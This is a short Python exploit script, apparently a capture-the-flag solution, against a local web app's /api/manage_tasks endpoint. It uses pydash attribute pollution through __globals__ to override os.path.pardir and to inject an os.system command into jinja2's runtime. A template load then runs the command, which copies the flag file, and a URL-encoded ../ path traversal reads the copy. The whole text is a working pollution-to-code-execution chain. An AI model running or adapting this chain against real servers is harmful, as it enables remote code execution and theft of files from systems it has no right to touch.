import requests

url = "http://172.17.0.2:1337"

def set_(attr, value):
    data = {"task": attr, "status": value}
    requests.post(url + "/api/manage_tasks", json=data)

# Setup vars
set_("get.__globals__.pydash.helpers.inspect.os.path.pardir", "NOPE")
set_("get.__globals__.pydash.helpers.inspect.sys.modules.jinja2.runtime.exported[0]", '*;import os;os.system("cp /flag* /tmp/flag") #')

# Load any template to execute
requests.get(url + "/home.html")

# Read flag
r = requests.get(url + "/..%2f..%2ftmp%2fflag")

print(r.text)

